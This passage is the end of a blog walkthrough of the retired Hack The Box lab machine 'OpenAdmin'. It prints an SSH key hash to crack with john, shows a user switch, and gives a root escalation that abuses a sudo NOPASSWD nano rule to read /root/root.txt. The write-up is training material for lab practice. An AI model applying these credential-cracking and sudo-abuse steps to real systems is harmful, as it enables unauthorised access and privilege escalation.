+joanna.txt:$sshng$1$16$2AF25344B8391A25A9B318F3FD767D6D$1200$906d14608706c9ac6ea6342a692d9ed47a9b87044b94d72d5b61df25e68a5235991f8bac883f40b539c829550ea5937c69dfd2b4c589f8c910e4c9c030982541e51b4717013fafbe1e1db9d6331c83cca061cc7550c0f4dd98da46ec1c7f460e4a135b6f1f04bafaf66a08db17ecad8a60f25a1a095d4f94a530f9f0bf9222c6736a5f54f1ff93c6182af4ad8a407044eb16ae6cd2a10c92acffa6095441ed63215b6126ed62de25b2803233cc3ea533d56b72d15a71b291547983bf5bee5b0966710f2b4edf264f0909d6f4c0f9cb372f4bb323715d17d5ded5f83117233976199c6d86bfc28421e217ccd883e7f0eecbc6f227fdc8dff12ca87a61207803dd47ef1f2f6769773f9cb52ea7bb34f96019e00531fcc267255da737ca3af49c88f73ed5f44e2afda28287fc6926660b8fb0267557780e53b407255dcb44899115c568089254d40963c8511f3492efe938a620bde879c953e67cfb55dbbf347ddd677792544c3bb11eb0843928a34d53c3e94fed25bff744544a69bc80c4ffc87ffd4d5c3ef5fd01c8b4114cacde7681ea9556f22fc863d07a0f1e96e099e749416cca147add636eb24f5082f9224e2907e3464d71ae711cf8a3f21bd4476bf98c633ff1bbebffb42d24544298c918a7b14c501d2c43534b8428d34d500537f0197e75a4279bbe4e8d2acee3c1586a59b28671e406c0e178b4d29aaa7a478b0258bde6628a3de723520a66fb0b31f1ea5bf45b693f868d47c2d89692920e2898ccd89710c42227d31293d9dad740791453ec8ebfb26047ccca53e0a200e9112f345f5559f8ded2f193feedd8c1db6bd0fbfa5441aa773dd5c4a60defe92e1b7d79182af16472872ab3c222bdd2b5f941604b7de582b08ce3f6635d83f66e9b84e6fe9d3eafa166f9e62a4cdc993d42ed8c0ad5713205a9fc7e5bc87b2feeaffe05167a27b04975e9366fa254adf511ffd7d07bc1f5075d70b2a7db06f2224692566fb5e8890c6e39038787873f21c52ce14e1e70e60b8fca716feb5d0727ac1c355cf633226c993ca2f16b95c59b3cc31ac7f641335d80ff1ad3e672f88609ec5a4532986e0567e169094189dcc82d11d46bf73bc6c48a05f84982aa222b4c0e78b18cceb15345116e74f5fbc55d407ed9ba12559f57f37512998565a54fe77ea2a2224abbddea75a1b6da09ae3ac043b6161809b630174603f33195827d14d0ebd64c6e48e0d0346b469d664f89e2ef0e4c28b6a64acdd3a0edf8a61915a246feb25e8e69b3710916e494d5f482bf6ab65c675f73c39b2c2eecdca6709188c6f36b6331953e3f93e27c987a3743eaa71502c43a807d8f91cdc4dc33f48b852efdc8fcc2647f2e588ae368d69998348f0bfcfe6d65892aebb86351825c2aa45afc2e6869987849d70cec46ba951c864accfb8476d5643e7926942ddd8f0f32c296662ba659e999b0fb0bbfde7ba2834e5ec931d576e4333d6b5e8960e9de46d32daa5360ce3d0d6b864d3324401c4975485f1aef6ba618edb12d679b0e861fe5549249962d08d25dc2dde517b23cf9a76dcf482530c9a34762f97361dd95352de4c82263cfaa90796c2fa33dd5ce1d889a045d587ef18a5b940a2880e1c706541e2b523572a8836d513f6e688444af86e2ba9ad2ded540deadd9559eb56ac66fe021c3f88c2a1a484d62d602903793d10d
+</code></pre></div><p>Then crack it with john:
+<img src="https://res.cloudinary.com/dtr6hzxnx/image/upload/v1589579094/blog/Image_9_fjpols.png" alt="enter image description here"></p>
+<p>Now we can switch to joanna user!</p>
+<div class="alert warning ">
+  <p>You need the original copy of rsa key to use here! And need to change    it&rsquo;s permissions.</p>
+</div>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ chmod <span style="color:#ae81ff">600</span> joanna.txt 
+</code></pre></div><p><img src="https://res.cloudinary.com/dtr6hzxnx/image/upload/v1589579220/blog/Image_10_pkhail.png" alt="enter image description here"></p>
+<p>Here you can get the <strong>user.txt</strong> flag.</p>
+<pre><code>$ cat user.txt
+</code></pre>
+<h2 id="privilege-escalation">🛡️Privilege Escalation</h2>
+<p>Let&rsquo;s check joanna&rsquo;s sudo permission:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"> joanna@openadmin:~$ sudo -l
+Matching Defaults entries <span style="color:#66d9ef">for</span> joanna on openadmin:
+   env_reset, mail_badpass, secure_path<span style="color:#f92672">=</span>/usr/local/sbin<span style="color:#ae81ff">\:</span>/usr/local/bin<span style="color:#ae81ff">\:</span>/usr/sbin<span style="color:#ae81ff">\:</span>/usr/bin<span style="color:#ae81ff">\:</span>/sbin<span style="color:#ae81ff">\:</span>/bin<span style="color:#ae81ff">\:</span>/snap/bin
+
+User joanna may run the following commands on openadmin:
+   <span style="color:#f92672">(</span>ALL<span style="color:#f92672">)</span> NOPASSWD: /bin/nano /opt/priv
+</code></pre></div><h2 id="complete">🍻Complete</h2>
+<p>Let&rsquo;s open nano with sudo privileges:</p>
+<pre><code>$ sudo nano /opt/priv
+</code></pre>
+<p>Press CTRL+R, type /root/root.txt and press ENTER.</p>
+<p><img src="https://res.cloudinary.com/dtr6hzxnx/image/upload/v1589581363/blog/Snipaste_2020-05-15_19-20-56_ejxabr.png" alt="enter image description here"></p>
+<p>And now we got the root flag.</p>
+              
+            </div>
+          </div>
+          <div id="post-footer" class="post-footer main-content-wrap">
+            
+              
+                
+                
+                  <div class="post-footer-tags">
+                    <span class="text-color-light text-small">TAGGED IN</span><br/>
+                    
+  <a class="tag tag--primary tag--small" href="https://tiagotavares.io/tags/hackthebox/">hackthebox</a>
+
+  <a class="tag tag--primary tag--small" href="https://tiagotavares.io/tags/hacking/">hacking</a>
+
+  <a class="tag tag--primary tag--small" href="https://tiagotavares.io/tags/ctf/">ctf</a>
+
+                  </div>
+                
+              
+            
+            <div class="post-actions-wrap">
+  
+      <nav >
+        <ul class="post-actions post-action-nav">
+          
+            <li class="post-action">
+              
+                <a class="post-action-btn btn btn--default tooltip--top" href="https://tiagotavares.io/2020/05/machine-xxx-hack-the-box-retired/" data-tooltip="MACHINE XXX - Hack The Box (Retired)">
+              
+                  <i class="fa fa-angle-left"></i>
+                  <span class="hide-xs hide-sm text-small icon-ml">NEXT</span>
+                </a>
+            </li>
+            <li class="post-action">
+              
+                <a class="post-action-btn btn btn--default tooltip--top" href="https://tiagotavares.io/2020/04/an%C3%A1lise-dos-dados-da-maratona-de-porto-alegre-2019/" data-tooltip="Análise dos dados da Maratona de Porto Alegre 2019">
+              
+                  <span class="hide-xs hide-sm text-small icon-mr">PREVIOUS</span>
+                  <i class="fa fa-angle-right"></i>
+                </a>
+            </li>
+          
+        </ul>
+      </nav>
+    <ul class="post-actions post-action-share" >
+      
+        <li class="post-action hide-lg hide-md hide-sm">
+          <a class="post-action-btn btn btn--default btn-open-shareoptions" href="#btn-open-shareoptions">
+            <i class="fa fa-share-alt"></i>
+          </a>
+        </li>
+        
+          <li class="post-action hide-xs">
+            <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https://tiagotavares.io/2020/04/openadmin-hack-the-box-retired/">
+              <i class="fa fa-facebook-official"></i>
+            </a>
+          </li>
+        
+          <li class="post-action hide-xs">
+            <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=https://tiagotavares.io/2020/04/openadmin-hack-the-box-retired/">
+              <i class="fa fa-twitter"></i>
+            </a>
+          </li>
+        
+          <li class="post-action hide-xs">
+            <a class="post-action-btn btn btn--default" target="new" href="https://plus.google.com/share?url=https://tiagotavares.io/2020/04/openadmin-hack-the-box-retired/">
+              <i class="fa fa-google-plus"></i>
+            </a>
+          </li>
+        
+      
+      
+        <li class="post-action">
+          <a class="post-action-btn btn btn--default" href="#disqus_thread">
+            <i class="fa fa-comment-o"></i>
+          </a>
+        </li>
+      
+      <li class="post-action">
+        
+          <a class="post-action-btn btn btn--default" href="#">
+        
+          <i class="fa fa-list"></i>
+        </a>
+      </li>
+    </ul>
+  
+</div>
+
+            
+              
+                <div id="disqus_thread">
+  <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+              
+            
+          </div>
+        </article>
+        <footer id="footer" class="main-content-wrap">
+  <span class="copyrights">
+    &copy; 2020 Tiago Tavares. All Rights Reserved
+  </span>
+</footer>
+
+      </div>
+      <div id="bottom-bar" class="post-bottom-bar" data-behavior="4">
+        <div class="post-actions-wrap">
+  
+      <nav >
+        <ul class="post-actions post-action-nav">
+          
+            <li class="post-action">
+              
+                <a class="post-action-btn btn btn--default tooltip--top" href="https://tiagotavares.io/2020/05/machine-xxx-hack-the-box-retired/" data-tooltip="MACHINE XXX - Hack The Box (Retired)">
+              
+                  <i class="fa fa-angle-left"></i>
+                  <span class="hide-xs hide-sm text-small icon-ml">NEXT</span>
+                </a>
+            </li>
+            <li class="post-action">
+              
+                <a class="post-action-btn btn btn--default tooltip--top" href="https://tiagotavares.io/2020/04/an%C3%A1lise-dos-dados-da-maratona-de-porto-alegre-2019/" data-tooltip="Análise dos dados da Maratona de Porto Alegre 2019">
+              
+                  <span class="hide-xs hide-sm text-small icon-mr">PREVIOUS</span>
+                  <i class="fa fa-angle-right"></i>
+                </a>
+            </li>
+          
+        </ul>
+      </nav>
+    <ul class="post-actions post-action-share" >
+      
+        <li class="post-action hide-lg hide-md hide-sm">
+          <a class="post-action-btn btn btn--default btn-open-shareoptions" href="#btn-open-shareoptions">
+            <i class="fa fa-share-alt"></i>
+          </a>
+        </li>
+        
+          <li class="post-action hide-xs">
+            <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https://tiagotavares.io/2020/04/openadmin-hack-the-box-retired/">
+              <i class="fa fa-facebook-official"></i>
+            </a>
+          </li>
+        
+          <li class="post-action hide-xs">
+            <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=https://tiagotavares.io/2020/04/openadmin-hack-the-box-retired/">
+              <i class="fa fa-twitter"></i>
+            </a>
+          </li>
+        
+          <li class="post-action hide-xs">
+            <a class="post-action-btn btn btn--default" target="new" href="https://plus.google.com/share?url=https://tiagotavares.io/2020/04/openadmin-hack-the-box-retired/">
+              <i class="fa fa-google-plus"></i>
+            </a>
+          </li>
+        
+      
+      
+        <li class="post-action">
+          <a class="post-action-btn btn btn--default" href="#disqus_thread">
+            <i class="fa fa-comment-o"></i>
+          </a>
+        </li>
+      
+      <li class="post-action">
+        
+          <a class="post-action-btn btn btn--default" href="#">
+        
+          <i class="fa fa-list"></i>
+        </a>
+      </li>
+    </ul>
+  
+</div>
+
+      </div>
+      <div id="share-options-bar" class="share-options-bar" data-behavior="4">
+  <i id="btn-close-shareoptions" class="fa fa-close"></i>
+  <ul class="share-options">
+    
+      <li class="share-option">
+        <a class="share-option-btn" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Ftiagotavares.io%2F2020%2F04%2Fopenadmin-hack-the-box-retired%2F">
+          <i class="fa fa-facebook-official"></i><span>Share on Facebook</span>
+        </a>
+      </li>
+    
+      <li class="share-option">
+        <a class="share-option-btn" target="new" href="https://twitter.com/intent/tweet?text=https%3A%2F%2Ftiagotavares.io%2F2020%2F04%2Fopenadmin-hack-the-box-retired%2F">
+          <i class="fa fa-twitter"></i><span>Share on Twitter</span>
+        </a>
+      </li>
+    
+      <li class="share-option">
+        <a class="share-option-btn" target="new" href="https://plus.google.com/share?url=https%3A%2F%2Ftiagotavares.io%2F2020%2F04%2Fopenadmin-hack-the-box-retired%2F">
+          <i class="fa fa-google-plus"></i><span>Share on Google&#43;</span>
+        </a>
+      </li>
+    
+  </ul>
+</div>
+<div id="share-options-mask" class="share-options-mask"></div>
+    </div>
+    
+    <div id="about">
+  <div id="about-card">
+    <div id="about-btn-close">
+      <i class="fa fa-remove"></i>
+    </div>
+    
+      <img id="about-card-picture" src="https://www.gravatar.com/avatar/e68e9fb3fa89ea576f47c7ef05d17448?s=110" alt="Author&#39;s picture" />
+    
+    <h4 id="about-card-name">Tiago Tavares</h4>
+    
+      <div id="about-card-bio">Eternal student, cybersecurity pro, husband, runner.</div>
+    
+    
+      <div id="about-card-job">
+        <i class="fa fa-briefcase"></i>
+        <br/>
+        Cybersecurity Consultant
+      </div>
+    
+    
+      <div id="about-card-location">
+        <i class="fa fa-map-marker"></i>
+        <br/>
+        Brazil
+      </div>
+    
+  </div>
+</div>
+
+    
+
+    
+  
+    <div id="cover" style="background-image:url('https://res.cloudinary.com/dtr6hzxnx/image/upload/v1589318923/last_jedi1_ybpjeb.jpg');"></div>
+  
+
+
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js" integrity="sha256-BbhdlvQf/xTY9gja0Dq3HiwQF8LaCRTXxZKRutelT44=" crossorigin="anonymous"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js" integrity="sha256-/BfiIkHlHoVihZdc6TFuj7MmJ0TWcWsMXkeDFwhi0zw=" crossorigin="anonymous"></script>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.7/js/jquery.fancybox.min.js" integrity="sha256-GEAnjcTqVP+vBp3SSc8bEDQqvWAZMiHyUSIorrWwH50=" crossorigin="anonymous"></script>
+
+
+<script src="https://tiagotavares.io/js/script-pcw6v3xilnxydl1vddzazdverrnn9ctynvnxgwho987mfyqkuylcb1nlt.min.js"></script>
+
+
+<script lang="javascript">
+window.onload = updateMinWidth;
+window.onresize = updateMinWidth;
+document.getElementById("sidebar").addEventListener("transitionend", updateMinWidth);
+function updateMinWidth() {
+  var sidebar = document.getElementById("sidebar");
+  var main = document.getElementById("main");
+  main.style.minWidth = "";
+  var w1 = getComputedStyle(main).getPropertyValue("min-width");
+  var w2 = getComputedStyle(sidebar).getPropertyValue("width");
+  var w3 = getComputedStyle(sidebar).getPropertyValue("left");
+  main.style.minWidth = `calc(${w1} - ${w2} - ${w3})`;
+}
+</script>
+
+<script>
+$(document).ready(function() {
+  hljs.configure({ classPrefix: '', useBR: false });
+  $('pre.code-highlight > code, pre > code').each(function(i, block) {
+    if (!$(this).hasClass('codeblock')) {
+      $(this).addClass('codeblock');
+    }
+    hljs.highlightBlock(block);
+  });
+});
+</script>
+
+
+  
+    
+      <script>
+        var disqus_config = function () {
+          this.page.url = 'https:\/\/tiagotavares.io\/2020\/04\/openadmin-hack-the-box-retired\/';
+          
+            this.page.identifier = '\/2020\/04\/openadmin-hack-the-box-retired\/'
+          
+        };
+        (function() {
+          
+          
+          if (window.location.hostname == "localhost") {
+            return;
+          }
+          var d = document, s = d.createElement('script');
+          var disqus_shortname = 'tiagotavares-io';
+          s.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+
+          s.setAttribute('data-timestamp', +new Date());
+          (d.head || d.body).appendChild(s);
+        })();
+      </script>
+    
+  
+
+
+
+
+    
+  </body>
+</html>
+
